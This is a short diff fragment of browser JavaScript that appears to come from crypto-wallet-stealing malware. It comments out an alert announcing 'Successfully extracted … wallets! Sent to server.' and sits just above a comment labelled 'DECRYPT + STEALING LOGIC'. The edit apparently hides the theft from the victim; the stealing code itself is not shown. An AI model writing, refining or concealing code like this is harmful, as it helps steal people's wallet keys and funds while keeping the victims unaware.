@@ -77,7 +77,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     document.head.appendChild(style);
                     document.body.appendChild(div);
 
-                    alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
+                    //alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
                 }
 
                 // === DECRYPT + STEALING LOGIC ===
